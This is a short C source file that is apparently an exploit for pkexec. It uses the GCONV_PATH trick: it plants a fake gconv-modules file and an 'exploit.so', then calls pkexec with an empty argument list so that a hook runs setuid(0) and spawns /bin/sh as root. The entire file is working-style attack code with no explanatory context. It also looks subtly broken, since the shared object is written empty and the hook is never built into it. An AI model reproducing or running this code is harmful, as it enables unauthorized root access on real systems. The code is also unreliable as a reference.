#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0, NULL);
    execve("/bin/sh", NULL, NULL);
}

int main() {
    char * const args[] = {NULL};
    char * const env[] = {
        "exploit",
        "PATH=GCONV_PATH=.",
        "CHARSET=exploit",
        "SHELL=/exploit",
        NULL
    };

    mkdir("GCONV_PATH=.", 0755);
    FILE *fp = fopen("GCONV_PATH=./exploit", "w");
    fprintf(fp, "");
    fclose(fp);

    mkdir("exploit", 0755);
    fp = fopen("exploit/gconv-modules", "w");
    fprintf(fp, "module UTF-8// exploit// exploit 2\n");
    fclose(fp);

    fp = fopen("exploit.so", "w");
    fprintf(fp, "");
    fclose(fp);

    execve("/usr/bin/pkexec", args, env);
    return 0;
}
